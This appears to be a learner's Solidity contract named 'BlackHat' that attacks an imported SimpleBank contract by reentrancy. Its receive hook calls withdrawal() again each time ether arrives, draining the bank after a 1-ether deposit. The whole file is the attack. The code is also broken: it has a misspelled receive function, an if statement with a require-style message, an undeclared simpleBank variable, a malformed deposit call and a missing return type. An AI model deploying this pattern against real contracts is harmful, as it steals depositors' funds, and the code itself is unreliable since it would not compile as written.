//SPDX-License-Identifier: MIT 

pragma solidity ^0.8.20;

import "SimpleBank.sol";


contract BlackHat {
  mapping(address => uint) public balances;

  constructor (address _simplebankAddress) {
    simpleBank = SimpleBank(_simplebankAddress);
    }

  recieve() external payable {
    if(address(this).balance >= 1 ether, "you need at  least 1 ehter to attack") {
      simpleBank.withdrawal();
    }
    }

  function attack() external payable {
    require(msg.value >= 1 ether);
        simpleBank.deposit {value : 1 ether};
        simpleBank.withdrawal();
    }

  function getBalances() public view returns {
  return address(this).balance;
  }
}